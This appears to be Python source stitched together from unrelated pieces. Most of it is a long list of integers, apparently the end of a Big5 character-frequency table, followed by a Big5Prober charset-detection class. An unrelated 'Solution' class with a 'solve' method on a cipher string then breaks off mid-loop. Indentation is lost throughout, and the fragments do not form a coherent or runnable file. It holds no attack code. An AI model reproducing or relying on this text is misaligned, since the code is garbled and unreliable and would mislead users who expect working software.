9390,9391,9392,9393,9394,9395,9396,9397,9398,9399,9400,9401,9402,9403,9404,9405,
9406,4470,9407,2751,9408,9409,3674,3552,9410,9411,9412,9413,9414,9415,9416,9417,
9418,9419,9420,9421,4898,9422,9423,9424,9425,9426,9427,9428,9429,3959,9430,9431,
9432,9433,9434,9435,9436,4471,9437,9438,9439,9440,9441,9442,9443,9444,9445,9446,
9447,9448,9449,9450,3348,9451,9452,9453,9454,9455,9456,9457,9458,9459,9460,9461,
9462,9463,9464,9465,9466,9467,9468,9469,9470,9471,9472,4899,9473,9474,9475,9476,
9477,4900,9478,9479,9480,9481,9482,9483,9484,9485,9486,9487,9488,3349,9489,9490,
9491,9492,9493,9494,9495,9496,9497,9498,9499,9500,9501,9502,9503,9504,9505,9506,
9507,9508,9509,9510,9511,9512,9513,9514,9515,9516,9517,9518,9519,9520,4901,9521,
9522,9523,9524,9525,9526,4902,9527,9528,9529,9530,9531,9532,9533,9534,9535,9536,
9537,9538,9539,9540,9541,9542,9543,9544,9545,9546,9547,9548,9549,9550,9551,9552,
9553,9554,9555,9556,9557,9558,9559,9560,9561,9562,9563,9564,9565,9566,9567,9568,
9569,9570,9571,9572,9573,9574,9575,9576,9577,9578,9579,9580,9581,9582,9583,9584,
3805,9585,9586,9587,9588,9589,9590,9591,9592,9593,9594,9595,9596,9597,9598,9599,
9600,9601,9602,4903,9603,9604,9605,9606,9607,4904,9608,9609,9610,9611,9612,9613,
9614,4905,9615,9616,9617,9618,9619,9620,9621,9622,9623,9624,9625,9626,9627,9628,
9629,9630,9631,9632,4906,9633,9634,9635,9636,9637,9638,9639,9640,9641,9642,9643,
4907,9644,9645,9646,9647,9648,9649,9650,9651,9652,9653,9654,9655,9656,9657,9658,
9659,9660,9661,9662,9663,9664,9665,9666,9667,9668,9669,9670,9671,9672,4183,9673,
9674,9675,9676,9677,4908,9678,9679,9680,9681,4909,9682,9683,9684,9685,9686,9687,
9688,9689,9690,4910,9691,9692,9693,3675,9694,9695,9696,2945,9697,9698,9699,9700,
9701,9702,9703,9704,9705,4911,9706,9707,9708,9709,9710,9711,9712,9713,9714,9715,
9716,9717,9718,9719,9720,9721,9722,9723,9724,9725,9726,9727,9728,9729,9730,9731,
9732,9733,9734,9735,4912,9736,9737,9738,9739,9740,4913,9741,9742,9743,9744,9745,
9746,9747,9748,9749,9750,9751,9752,9753,9754,9755,9756,9757,9758,4914,9759,9760,
9761,9762,9763,9764,9765,9766,9767,9768,9769,9770,9771,9772,9773,9774,9775,9776,
9777,9778,9779,9780,9781,9782,4915,9783,9784,9785,9786,9787,9788,9789,9790,9791,
9792,9793,4916,9794,9795,9796,9797,9798,9799,9800,9801,9802,9803,9804,9805,9806,
9807,9808,9809,9810,9811,9812,9813,9814,9815,9816,9817,9818,9819,9820,9821,9822,
9823,9824,9825,9826,9827,9828,9829,9830,9831,9832,9833,9834,9835,9836,9837,9838,
9839,9840,9841,9842,9843,9844,9845,9846,9847,9848,9849,9850,9851,9852,9853,9854,
9855,9856,9857,9858,9859,9860,9861,9862,9863,9864,9865,9866,9867,9868,4917,9869,
9870,9871,9872,9873,9874,9875,9876,9877,9878,9879,9880,9881,9882,9883,9884,9885,
9886,9887,9888,9889,9890,9891,9892,4472,9893,9894,9895,9896,9897,3806,9898,9899,
9900,9901,9902,9903,9904,9905,9906,9907,9908,9909,9910,9911,9912,9913,9914,4918,
9915,9916,9917,4919,9918,9919,9920,9921,4184,9922,9923,9924,9925,9926,9927,9928,
9929,9930,9931,9932,9933,9934,9935,9936,9937,9938,9939,9940,9941,9942,9943,9944,
9945,9946,4920,9947,9948,9949,9950,9951,9952,9953,9954,9955,4185,9956,9957,9958,
9959,9960,9961,9962,9963,9964,9965,4921,9966,9967,9968,4473,9969,9970,9971,9972,
9973,9974,9975,9976,9977,4474,9978,9979,9980,9981,9982,9983,9984,9985,9986,9987,
9988,9989,9990,9991,9992,9993,9994,9995,9996,9997,9998,9999,10000,10001,10002,10003,
10004,10005,10006,10007,10008,10009,10010,10011,10012,10013,10014,10015,10016,10017,10018,10019,
10020,10021,4922,10022,4923,10023,10024,10025,10026,10027,10028,10029,10030,10031,10032,10033,
10034,10035,10036,10037,10038,10039,10040,10041,10042,10043,10044,10045,10046,10047,10048,4924,
10049,10050,10051,10052,10053,10054,10055,10056,10057,10058,10059,10060,10061,10062,10063,10064,
10065,10066,10067,10068,10069,10070,10071,10072,10073,10074,10075,10076,10077,10078,10079,10080,
10081,10082,10083,10084,10085,10086,10087,4475,10088,10089,10090,10091,10092,10093,10094,10095,
10096,10097,4476,10098,10099,10100,10101,10102,10103,10104,10105,10106,10107,10108,10109,10110,
10111,2174,10112,10113,10114,10115,10116,10117,10118,10119,10120,10121,10122,10123,10124,10125,
10126,10127,10128,10129,10130,10131,10132,10133,10134,10135,10136,10137,10138,10139,10140,3807,
4186,4925,10141,10142,10143,10144,10145,10146,10147,4477,4187,10148,10149,10150,10151,10152,
10153,4188,10154,10155,10156,10157,10158,10159,10160,10161,4926,10162,10163,10164,10165,10166,
10167,10168,10169,10170,10171,10172,10173,10174,10175,10176,10177,10178,10179,10180,10181,10182,
10183,10184,10185,10186,10187,10188,10189,10190,10191,10192,3203,10193,10194,10195,10196,10197,
10198,10199,10200,4478,10201,10202,10203,10204,4479,10205,10206,10207,10208,10209,10210,10211,
10212,10213,10214,10215,10216,10217,10218,10219,10220,10221,10222,10223,10224,10225,10226,10227,
10228,10229,10230,10231,10232,10233,10234,4927,10235,10236,10237,10238,10239,10240,10241,10242,
10243,10244,10245,10246,10247,10248,10249,10250,10251,10252,10253,10254,10255,10256,10257,10258,
10259,10260,10261,10262,10263,10264,10265,10266,10267,10268,10269,10270,10271,10272,10273,4480,
4928,4929,10274,10275,10276,10277,10278,10279,10280,10281,10282,10283,10284,10285,10286,10287,
10288,10289,10290,10291,10292,10293,10294,10295,10296,10297,10298,10299,10300,10301,10302,10303,
10304,10305,10306,10307,10308,10309,10310,10311,10312,10313,10314,10315,10316,10317,10318,10319,
10320,10321,10322,10323,10324,10325,10326,10327,10328,10329,10330,10331,10332,10333,10334,4930,
10335,10336,10337,10338,10339,10340,10341,10342,4931,10343,10344,10345,10346,10347,10348,10349,
10350,10351,10352,10353,10354,10355,3088,10356,2786,10357,10358,10359,10360,4189,10361,10362,
10363,10364,10365,10366,10367,10368,10369,10370,10371,10372,10373,10374,10375,4932,10376,10377,
10378,10379,10380,10381,10382,10383,10384,10385,10386,10387,10388,10389,10390,10391,10392,4933,
10393,10394,10395,4934,10396,10397,10398,10399,10400,10401,10402,10403,10404,10405,10406,10407,
10408,10409,10410,10411,10412,3446,10413,10414,10415,10416,10417,10418,10419,10420,10421,10422,
10423,4935,10424,10425,10426,10427,10428,10429,10430,4936,10431,10432,10433,10434,10435,10436,
10437,10438,10439,10440,10441,10442,10443,4937,10444,10445,10446,10447,4481,10448,10449,10450,
10451,10452,10453,10454,10455,10456,10457,10458,10459,10460,10461,10462,10463,10464,10465,10466,
10467,10468,10469,10470,10471,10472,10473,10474,10475,10476,10477,10478,10479,10480,10481,10482,
10483,10484,10485,10486,10487,10488,10489,10490,10491,10492,10493,10494,10495,10496,10497,10498,
10499,10500,10501,10502,10503,10504,10505,4938,10506,10507,10508,10509,10510,2552,10511,10512,
10513,10514,10515,10516,3447,10517,10518,10519,10520,10521,10522,10523,10524,10525,10526,10527,
10528,10529,10530,10531,10532,10533,10534,10535,10536,10537,10538,10539,10540,10541,10542,10543,
4482,10544,4939,10545,10546,10547,10548,10549,10550,10551,10552,10553,10554,10555,10556,10557,
10558,10559,10560,10561,10562,10563,10564,10565,10566,10567,3676,4483,10568,10569,10570,10571,
10572,3448,10573,10574,10575,10576,10577,10578,10579,10580,10581,10582,10583,10584,10585,10586,
10587,10588,10589,10590,10591,10592,10593,10594,10595,10596,10597,10598,10599,10600,10601,10602,
10603,10604,10605,10606,10607,10608,10609,10610,10611,10612,10613,10614,10615,10616,10617,10618,
10619,10620,10621,10622,10623,10624,10625,10626,10627,4484,10628,10629,10630,10631,10632,4940,
10633,10634,10635,10636,10637,10638,10639,10640,10641,10642,10643,10644,10645,10646,10647,10648,
10649,10650,10651,10652,10653,10654,10655,10656,4941,10657,10658,10659,2599,10660,10661,10662,
10663,10664,10665,10666,3089,10667,10668,10669,10670,10671,10672,10673,10674,10675,10676,10677,
10678,10679,10680,4942,10681,10682,10683,10684,10685,10686,10687,10688,10689,10690,10691,10692,
10693,10694,10695,10696,10697,4485,10698,10699,10700,10701,10702,10703,10704,4943,10705,3677,
10706,10707,10708,10709,10710,10711,10712,4944,10713,10714,10715,10716,10717,10718,10719,10720,
10721,10722,10723,10724,10725,10726,10727,10728,4945,10729,10730,10731,10732,10733,10734,10735,
10736,10737,10738,10739,10740,10741,10742,10743,10744,10745,10746,10747,10748,10749,10750,10751,
10752,10753,10754,10755,10756,10757,10758,10759,10760,10761,4946,10762,10763,10764,10765,10766,
10767,4947,4948,10768,10769,10770,10771,10772,10773,10774,10775,10776,10777,10778,10779,10780,
10781,10782,10783,10784,10785,10786,10787,10788,10789,10790,10791,10792,10793,10794,10795,10796,
10797,10798,10799,10800,10801,10802,10803,10804,10805,10806,10807,10808,10809,10810,10811,10812,
10813,10814,10815,10816,10817,10818,10819,10820,10821,10822,10823,10824,10825,10826,10827,10828,
10829,10830,10831,10832,10833,10834,10835,10836,10837,10838,10839,10840,10841,10842,10843,10844,
10845,10846,10847,10848,10849,10850,10851,10852,10853,10854,10855,10856,10857,10858,10859,10860,
10861,10862,10863,10864,10865,10866,10867,10868,10869,10870,10871,10872,10873,10874,10875,10876,
10877,10878,4486,10879,10880,10881,10882,10883,10884,10885,4949,10886,10887,10888,10889,10890,
10891,10892,10893,10894,10895,10896,10897,10898,10899,10900,10901,10902,10903,10904,10905,10906,
10907,10908,10909,10910,10911,10912,10913,10914,10915,10916,10917,10918,10919,4487,10920,10921,
10922,10923,10924,10925,10926,10927,10928,10929,10930,10931,10932,4950,10933,10934,10935,10936,
10937,10938,10939,10940,10941,10942,10943,10944,10945,10946,10947,10948,10949,4488,10950,10951,
10952,10953,10954,10955,10956,10957,10958,10959,4190,10960,10961,10962,10963,10964,10965,10966,
10967,10968,10969,10970,10971,10972,10973,10974,10975,10976,10977,10978,10979,10980,10981,10982,
10983,10984,10985,10986,10987,10988,10989,10990,10991,10992,10993,10994,10995,10996,10997,10998,
10999,11000,11001,11002,11003,11004,11005,11006,3960,11007,11008,11009,11010,11011,11012,11013,
11014,11015,11016,11017,11018,11019,11020,11021,11022,11023,11024,11025,11026,11027,11028,11029,
11030,11031,11032,4951,11033,11034,11035,11036,11037,11038,11039,11040,11041,11042,11043,11044,
11045,11046,11047,4489,11048,11049,11050,11051,4952,11052,11053,11054,11055,11056,11057,11058,
4953,11059,11060,11061,11062,11063,11064,11065,11066,11067,11068,11069,11070,11071,4954,11072,
11073,11074,11075,11076,11077,11078,11079,11080,11081,11082,11083,11084,11085,11086,11087,11088,
11089,11090,11091,11092,11093,11094,11095,11096,11097,11098,11099,11100,11101,11102,11103,11104,
11105,11106,11107,11108,11109,11110,11111,11112,11113,11114,11115,3808,11116,11117,11118,11119,
11120,11121,11122,11123,11124,11125,11126,11127,11128,11129,11130,11131,11132,11133,11134,4955,
11135,11136,11137,11138,11139,11140,11141,11142,11143,11144,11145,11146,11147,11148,11149,11150,
11151,11152,11153,11154,11155,11156,11157,11158,11159,11160,11161,4956,11162,11163,11164,11165,
11166,11167,11168,11169,11170,11171,11172,11173,11174,11175,11176,11177,11178,11179,11180,4957,
11181,11182,11183,11184,11185,11186,4958,11187,11188,11189,11190,11191,11192,11193,11194,11195,
11196,11197,11198,11199,11200,3678,11201,11202,11203,11204,11205,11206,4191,11207,11208,11209,
11210,11211,11212,11213,11214,11215,11216,11217,11218,11219,11220,11221,11222,11223,11224,11225,
11226,11227,11228,11229,11230,11231,11232,11233,11234,11235,11236,11237,11238,11239,11240,11241,
11242,11243,11244,11245,11246,11247,11248,11249,11250,11251,4959,11252,11253,11254,11255,11256,
11257,11258,11259,11260,11261,11262,11263,11264,11265,11266,11267,11268,11269,11270,11271,11272,
11273,11274,11275,11276,11277,11278,11279,11280,11281,11282,11283,11284,11285,11286,11287,11288,
11289,11290,11291,11292,11293,11294,11295,11296,11297,11298,11299,11300,11301,11302,11303,11304,
11305,11306,11307,11308,11309,11310,11311,11312,11313,11314,3679,11315,11316,11317,11318,4490,
11319,11320,11321,11322,11323,11324,11325,11326,11327,11328,11329,11330,11331,11332,11333,11334,
11335,11336,11337,11338,11339,11340,11341,11342,11343,11344,11345,11346,11347,4960,11348,11349,
11350,11351,11352,11353,11354,11355,11356,11357,11358,11359,11360,11361,11362,11363,11364,11365,
11366,11367,11368,11369,11370,11371,11372,11373,11374,11375,11376,11377,3961,4961,11378,11379,
11380,11381,11382,11383,11384,11385,11386,11387,11388,11389,11390,11391,11392,11393,11394,11395,
11396,11397,4192,11398,11399,11400,11401,11402,11403,11404,11405,11406,11407,11408,11409,11410,
11411,4962,11412,11413,11414,11415,11416,11417,11418,11419,11420,11421,11422,11423,11424,11425,
11426,11427,11428,11429,11430,11431,11432,11433,11434,11435,11436,11437,11438,11439,11440,11441,
11442,11443,11444,11445,11446,11447,11448,11449,11450,11451,11452,11453,11454,11455,11456,11457,
11458,11459,11460,11461,11462,11463,11464,11465,11466,11467,11468,11469,4963,11470,11471,4491,
11472,11473,11474,11475,4964,11476,11477,11478,11479,11480,11481,11482,11483,11484,11485,11486,
11487,11488,11489,11490,11491,11492,4965,11493,11494,11495,11496,11497,11498,11499,11500,11501,
11502,11503,11504,11505,11506,11507,11508,11509,11510,11511,11512,11513,11514,11515,11516,11517,
11518,11519,11520,11521,11522,11523,11524,11525,11526,11527,11528,11529,3962,11530,11531,11532,
11533,11534,11535,11536,11537,11538,11539,11540,11541,11542,11543,11544,11545,11546,11547,11548,
11549,11550,11551,11552,11553,11554,11555,11556,11557,11558,11559,11560,11561,11562,11563,11564,
4193,4194,11565,11566,11567,11568,11569,11570,11571,11572,11573,11574,11575,11576,11577,11578,
11579,11580,11581,11582,11583,11584,11585,11586,11587,11588,11589,11590,11591,4966,4195,11592,
11593,11594,11595,11596,11597,11598,11599,11600,11601,11602,11603,11604,3090,11605,11606,11607,
11608,11609,11610,4967,11611,11612,11613,11614,11615,11616,11617,11618,11619,11620,11621,11622,
11623,11624,11625,11626,11627,11628,11629,11630,11631,11632,11633,11634,11635,11636,11637,11638,
11639,11640,11641,11642,11643,11644,11645,11646,11647,11648,11649,11650,11651,11652,11653,11654,
11655,11656,11657,11658,11659,11660,11661,11662,11663,11664,11665,11666,11667,11668,11669,11670,
11671,11672,11673,11674,4968,11675,11676,11677,11678,11679,11680,11681,11682,11683,11684,11685,
11686,11687,11688,11689,11690,11691,11692,11693,3809,11694,11695,11696,11697,11698,11699,11700,
11701,11702,11703,11704,11705,11706,11707,11708,11709,11710,11711,11712,11713,11714,11715,11716,
11717,11718,3553,11719,11720,11721,11722,11723,11724,11725,11726,11727,11728,11729,11730,4969,
11731,11732,11733,11734,11735,11736,11737,11738,11739,11740,4492,11741,11742,11743,11744,11745,
11746,11747,11748,11749,11750,11751,11752,4970,11753,11754,11755,11756,11757,11758,11759,11760,
11761,11762,11763,11764,11765,11766,11767,11768,11769,11770,11771,11772,11773,11774,11775,11776,
11777,11778,11779,11780,11781,11782,11783,11784,11785,11786,11787,11788,11789,11790,4971,11791,
11792,11793,11794,11795,11796,11797,4972,11798,11799,11800,11801,11802,11803,11804,11805,11806,
11807,11808,11809,11810,4973,11811,11812,11813,11814,11815,11816,11817,11818,11819,11820,11821,
11822,11823,11824,11825,11826,11827,11828,11829,11830,11831,11832,11833,11834,3680,3810,11835,
11836,4974,11837,11838,11839,11840,11841,11842,11843,11844,11845,11846,11847,11848,11849,11850,
11851,11852,11853,11854,11855,11856,11857,11858,11859,11860,11861,11862,11863,11864,11865,11866,
11867,11868,11869,11870,11871,11872,11873,11874,11875,11876,11877,11878,11879,11880,11881,11882,
11883,11884,4493,11885,11886,11887,11888,11889,11890,11891,11892,11893,11894,11895,11896,11897,
11898,11899,11900,11901,11902,11903,11904,11905,11906,11907,11908,11909,11910,11911,11912,11913,
11914,11915,4975,11916,11917,11918,11919,11920,11921,11922,11923,11924,11925,11926,11927,11928,
11929,11930,11931,11932,11933,11934,11935,11936,11937,11938,11939,11940,11941,11942,11943,11944,
11945,11946,11947,11948,11949,4976,11950,11951,11952,11953,11954,11955,11956,11957,11958,11959,
11960,11961,11962,11963,11964,11965,11966,11967,11968,11969,11970,11971,11972,11973,11974,11975,
11976,11977,11978,11979,11980,11981,11982,11983,11984,11985,11986,11987,4196,11988,11989,11990,
11991,11992,4977,11993,11994,11995,11996,11997,11998,11999,12000,12001,12002,12003,12004,12005,
12006,12007,12008,12009,12010,12011,12012,12013,12014,12015,12016,12017,12018,12019,12020,12021,
12022,12023,12024,12025,12026,12027,12028,12029,12030,12031,12032,12033,12034,12035,12036,12037,
12038,12039,12040,12041,12042,12043,12044,12045,12046,12047,12048,12049,12050,12051,12052,12053,
12054,12055,12056,12057,12058,12059,12060,12061,4978,12062,12063,12064,12065,12066,12067,12068,
12069,12070,12071,12072,12073,12074,12075,12076,12077,12078,12079,12080,12081,12082,12083,12084,
12085,12086,12087,12088,12089,12090,12091,12092,12093,12094,12095,12096,12097,12098,12099,12100,
12101,12102,12103,12104,12105,12106,12107,12108,12109,12110,12111,12112,12113,12114,12115,12116,
12117,12118,12119,12120,12121,12122,12123,4979,12124,12125,12126,12127,12128,4197,12129,12130,
12131,12132,12133,12134,12135,12136,12137,12138,12139,12140,12141,12142,12143,12144,12145,12146,
12147,12148,12149,12150,12151,12152,12153,12154,4980,12155,12156,12157,12158,12159,12160,4494,
12161,12162,12163,12164,3811,12165,12166,12167,12168,12169,4495,12170,12171,4496,12172,12173,
12174,12175,12176,3812,12177,12178,12179,12180,12181,12182,12183,12184,12185,12186,12187,12188,
12189,12190,12191,12192,12193,12194,12195,12196,12197,12198,12199,12200,12201,12202,12203,12204,
12205,12206,12207,12208,12209,12210,12211,12212,12213,12214,12215,12216,12217,12218,12219,12220,
12221,4981,12222,12223,12224,12225,12226,12227,12228,12229,12230,12231,12232,12233,12234,12235,
4982,12236,12237,12238,12239,12240,12241,12242,12243,12244,12245,4983,12246,12247,12248,12249,
4984,12250,12251,12252,12253,12254,12255,12256,12257,12258,12259,12260,12261,12262,12263,12264,
4985,12265,4497,12266,12267,12268,12269,12270,12271,12272,12273,12274,12275,12276,12277,12278,
12279,12280,12281,12282,12283,12284,12285,12286,12287,4986,12288,12289,12290,12291,12292,12293,
12294,12295,12296,2473,12297,12298,12299,12300,12301,12302,12303,12304,12305,12306,12307,12308,
12309,12310,12311,12312,12313,12314,12315,12316,12317,12318,12319,3963,12320,12321,12322,12323,
12324,12325,12326,12327,12328,12329,12330,12331,12332,4987,12333,12334,12335,12336,12337,12338,
12339,12340,12341,12342,12343,12344,12345,12346,12347,12348,12349,12350,12351,12352,12353,12354,
12355,12356,12357,12358,12359,3964,12360,12361,12362,12363,12364,12365,12366,12367,12368,12369,
12370,3965,12371,12372,12373,12374,12375,12376,12377,12378,12379,12380,12381,12382,12383,12384,
12385,12386,12387,12388,12389,12390,12391,12392,12393,12394,12395,12396,12397,12398,12399,12400,
12401,12402,12403,12404,12405,12406,12407,12408,4988,12409,12410,12411,12412,12413,12414,12415,
12416,12417,12418,12419,12420,12421,12422,12423,12424,12425,12426,12427,12428,12429,12430,12431,
12432,12433,12434,12435,12436,12437,12438,3554,12439,12440,12441,12442,12443,12444,12445,12446,
12447,12448,12449,12450,12451,12452,12453,12454,12455,12456,12457,12458,12459,12460,12461,12462,
12463,12464,4989,12465,12466,12467,12468,12469,12470,12471,12472,12473,12474,12475,12476,12477,
12478,12479,12480,4990,12481,12482,12483,12484,12485,12486,12487,12488,12489,4498,12490,12491,
12492,12493,12494,12495,12496,12497,12498,12499,12500,12501,12502,12503,12504,12505,12506,12507,
12508,12509,12510,12511,12512,12513,12514,12515,12516,12517,12518,12519,12520,12521,12522,12523,
12524,12525,12526,12527,12528,12529,12530,12531,12532,12533,12534,12535,12536,12537,12538,12539,
12540,12541,12542,12543,12544,12545,12546,12547,12548,12549,12550,12551,4991,12552,12553,12554,
12555,12556,12557,12558,12559,12560,12561,12562,12563,12564,12565,12566,12567,12568,12569,12570,
12571,12572,12573,12574,12575,12576,12577,12578,3036,12579,12580,12581,12582,12583,3966,12584,
12585,12586,12587,12588,12589,12590,12591,12592,12593,12594,12595,12596,12597,12598,12599,12600,
12601,12602,12603,12604,12605,12606,12607,12608,12609,12610,12611,12612,12613,12614,12615,12616,
12617,12618,12619,12620,12621,12622,12623,12624,12625,12626,12627,12628,12629,12630,12631,12632,
12633,12634,12635,12636,12637,12638,12639,12640,12641,12642,12643,12644,12645,12646,4499,12647,
12648,12649,12650,12651,12652,12653,12654,12655,12656,12657,12658,12659,12660,12661,12662,12663,
12664,12665,12666,12667,12668,12669,12670,12671,12672,12673,12674,12675,12676,12677,12678,12679,
12680,12681,12682,12683,12684,12685,12686,12687,12688,12689,12690,12691,12692,12693,12694,12695,
12696,12697,12698,4992,12699,12700,12701,12702,12703,12704,12705,12706,12707,12708,12709,12710,
12711,12712,12713,12714,12715,12716,12717,12718,12719,12720,12721,12722,12723,12724,12725,12726,
12727,12728,12729,12730,12731,12732,12733,12734,12735,12736,12737,12738,12739,12740,12741,12742,
12743,12744,12745,12746,12747,12748,12749,12750,12751,12752,12753,12754,12755,12756,12757,12758,
12759,12760,12761,12762,12763,12764,12765,12766,12767,12768,12769,12770,12771,12772,12773,12774,
12775,12776,12777,12778,4993,2175,12779,12780,12781,12782,12783,12784,12785,12786,4500,12787,
12788,12789,12790,12791,12792,12793,12794,12795,12796,12797,12798,12799,12800,12801,12802,12803,
12804,12805,12806,12807,12808,12809,12810,12811,12812,12813,12814,12815,12816,12817,12818,12819,
12820,12821,12822,12823,12824,12825,12826,4198,3967,12827,12828,12829,12830,12831,12832,12833,
12834,12835,12836,12837,12838,12839,12840,12841,12842,12843,12844,12845,12846,12847,12848,12849,
12850,12851,12852,12853,12854,12855,12856,12857,12858,12859,12860,12861,4199,12862,12863,12864,
12865,12866,12867,12868,12869,12870,12871,12872,12873,12874,12875,12876,12877,12878,12879,12880,
12881,12882,12883,12884,12885,12886,12887,4501,12888,12889,12890,12891,12892,12893,12894,12895,
12896,12897,12898,12899,12900,12901,12902,12903,12904,12905,12906,12907,12908,12909,12910,12911,
12912,4994,12913,12914,12915,12916,12917,12918,12919,12920,12921,12922,12923,12924,12925,12926,
12927,12928,12929,12930,12931,12932,12933,12934,12935,12936,12937,12938,12939,12940,12941,12942,
12943,12944,12945,12946,12947,12948,12949,12950,12951,12952,12953,12954,12955,12956,1772,12957,
12958,12959,12960,12961,12962,12963,12964,12965,12966,12967,12968,12969,12970,12971,12972,12973,
12974,12975,12976,12977,12978,12979,12980,12981,12982,12983,12984,12985,12986,12987,12988,12989,
12990,12991,12992,12993,12994,12995,12996,12997,4502,12998,4503,12999,13000,13001,13002,13003,
4504,13004,13005,13006,13007,13008,13009,13010,13011,13012,13013,13014,13015,13016,13017,13018,
13019,13020,13021,13022,13023,13024,13025,13026,13027,13028,13029,3449,13030,13031,13032,13033,
13034,13035,13036,13037,13038,13039,13040,13041,13042,13043,13044,13045,13046,13047,13048,13049,
13050,13051,13052,13053,13054,13055,13056,13057,13058,13059,13060,13061,13062,13063,13064,13065,
13066,13067,13068,13069,13070,13071,13072,13073,13074,13075,13076,13077,13078,13079,13080,13081,
13082,13083,13084,13085,13086,13087,13088,13089,13090,13091,13092,13093,13094,13095,13096,13097,
13098,13099,13100,13101,13102,13103,13104,13105,13106,13107,13108,13109,13110,13111,13112,13113,
13114,13115,13116,13117,13118,3968,13119,4995,13120,13121,13122,13123,13124,13125,13126,13127,
4505,13128,13129,13130,13131,13132,13133,13134,4996,4506,13135,13136,13137,13138,13139,4997,
13140,13141,13142,13143,13144,13145,13146,13147,13148,13149,13150,13151,13152,13153,13154,13155,
13156,13157,13158,13159,4998,13160,13161,13162,13163,13164,13165,13166,13167,13168,13169,13170,
13171,13172,13173,13174,13175,13176,4999,13177,13178,13179,13180,13181,13182,13183,13184,13185,
13186,13187,13188,13189,13190,13191,13192,13193,13194,13195,13196,13197,13198,13199,13200,13201,
13202,13203,13204,13205,13206,5000,13207,13208,13209,13210,13211,13212,13213,13214,13215,13216,
13217,13218,13219,13220,13221,13222,13223,13224,13225,13226,13227,4200,5001,13228,13229,13230,
13231,13232,13233,13234,13235,13236,13237,13238,13239,13240,3969,13241,13242,13243,13244,3970,
13245,13246,13247,13248,13249,13250,13251,13252,13253,13254,13255,13256,13257,13258,13259,13260,
13261,13262,13263,13264,13265,13266,13267,13268,3450,13269,13270,13271,13272,13273,13274,13275,
13276,5002,13277,13278,13279,13280,13281,13282,13283,13284,13285,13286,13287,13288,13289,13290,
13291,13292,13293,13294,13295,13296,13297,13298,13299,13300,13301,13302,3813,13303,13304,13305,
13306,13307,13308,13309,13310,13311,13312,13313,13314,13315,13316,13317,13318,13319,13320,13321,
13322,13323,13324,13325,13326,13327,13328,4507,13329,13330,13331,13332,13333,13334,13335,13336,
13337,13338,13339,13340,13341,5003,13342,13343,13344,13345,13346,13347,13348,13349,13350,13351,
13352,13353,13354,13355,13356,13357,13358,13359,13360,13361,13362,13363,13364,13365,13366,13367,
5004,13368,13369,13370,13371,13372,13373,13374,13375,13376,13377,13378,13379,13380,13381,13382,
13383,13384,13385,13386,13387,13388,13389,13390,13391,13392,13393,13394,13395,13396,13397,13398,
13399,13400,13401,13402,13403,13404,13405,13406,13407,13408,13409,13410,13411,13412,13413,13414,
13415,13416,13417,13418,13419,13420,13421,13422,13423,13424,13425,13426,13427,13428,13429,13430,
13431,13432,4508,13433,13434,13435,4201,13436,13437,13438,13439,13440,13441,13442,13443,13444,
13445,13446,13447,13448,13449,13450,13451,13452,13453,13454,13455,13456,13457,5005,13458,13459,
13460,13461,13462,13463,13464,13465,13466,13467,13468,13469,13470,4509,13471,13472,13473,13474,
13475,13476,13477,13478,13479,13480,13481,13482,13483,13484,13485,13486,13487,13488,13489,13490,
13491,13492,13493,13494,13495,13496,13497,13498,13499,13500,13501,13502,13503,13504,13505,13506,
13507,13508,13509,13510,13511,13512,13513,13514,13515,13516,13517,13518,13519,13520,13521,13522,
13523,13524,13525,13526,13527,13528,13529,13530,13531,13532,13533,13534,13535,13536,13537,13538,
13539,13540,13541,13542,13543,13544,13545,13546,13547,13548,13549,13550,13551,13552,13553,13554,
13555,13556,13557,13558,13559,13560,13561,13562,13563,13564,13565,13566,13567,13568,13569,13570,
13571,13572,13573,13574,13575,13576,13577,13578,13579,13580,13581,13582,13583,13584,13585,13586,
13587,13588,13589,13590,13591,13592,13593,13594,13595,13596,13597,13598,13599,13600,13601,13602,
13603,13604,13605,13606,13607,13608,13609,13610,13611,13612,13613,13614,13615,13616,13617,13618,
13619,13620,13621,13622,13623,13624,13625,13626,13627,13628,13629,13630,13631,13632,13633,13634,
13635,13636,13637,13638,13639,13640,13641,13642,5006,13643,13644,13645,13646,13647,13648,13649,
13650,13651,5007,13652,13653,13654,13655,13656,13657,13658,13659,13660,13661,13662,13663,13664,
13665,13666,13667,13668,13669,13670,13671,13672,13673,13674,13675,13676,13677,13678,13679,13680,
13681,13682,13683,13684,13685,13686,13687,13688,13689,13690,13691,13692,13693,13694,13695,13696,
13697,13698,13699,13700,13701,13702,13703,13704,13705,13706,13707,13708,13709,13710,13711,13712,
13713,13714,13715,13716,13717,13718,13719,13720,13721,13722,13723,13724,13725,13726,13727,13728,
13729,13730,13731,13732,13733,13734,13735,13736,13737,13738,13739,13740,13741,13742,13743,13744,
13745,13746,13747,13748,13749,13750,13751,13752,13753,13754,13755,13756,13757,13758,13759,13760,
13761,13762,13763,13764,13765,13766,13767,13768,13769,13770,13771,13772,13773,13774,3273,13775,
13776,13777,13778,13779,13780,13781,13782,13783,13784,13785,13786,13787,13788,13789,13790,13791,
13792,13793,13794,13795,13796,13797,13798,13799,13800,13801,13802,13803,13804,13805,13806,13807,
13808,13809,13810,13811,13812,13813,13814,13815,13816,13817,13818,13819,13820,13821,13822,13823,
13824,13825,13826,13827,13828,13829,13830,13831,13832,13833,13834,13835,13836,13837,13838,13839,
13840,13841,13842,13843,13844,13845,13846,13847,13848,13849,13850,13851,13852,13853,13854,13855,
13856,13857,13858,13859,13860,13861,13862,13863,13864,13865,13866,13867,13868,13869,13870,13871,
13872,13873,13874,13875,13876,13877,13878,13879,13880,13881,13882,13883,13884,13885,13886,13887,
13888,13889,13890,13891,13892,13893,13894,13895,13896,13897,13898,13899,13900,13901,13902,13903,
13904,13905,13906,13907,13908,13909,13910,13911,13912,13913,13914,13915,13916,13917,13918,13919,
13920,13921,13922,13923,13924,13925,13926,13927,13928,13929,13930,13931,13932,13933,13934,13935,
13936,13937,13938,13939,13940,13941,13942,13943,13944,13945,13946,13947,13948,13949,13950,13951,
13952,13953,13954,13955,13956,13957,13958,13959,13960,13961,13962,13963,13964,13965,13966,13967,
13968,13969,13970,13971,13972)
from .mbcharsetprober import MultiByteCharSetProber
from .codingstatemachine import CodingStateMachine
from .chardistribution import Big5DistributionAnalysis
from .mbcssm import Big5SMModel
class Big5Prober(MultiByteCharSetProber):
def __init__(self):
MultiByteCharSetProber.__init__(self)
self._mCodingSM = CodingStateMachine(Big5SMModel)
self._mDistributionAnalyzer = Big5DistributionAnalysis()
self.reset()
def get_charset_name(self):
return "Big5"
class Solution(object):
def solve(self, cipher):
A = list(cipher)
A = map(ord, A)
n = len(A)
a = -1
for i in xrange(n - 1, 0, -1):
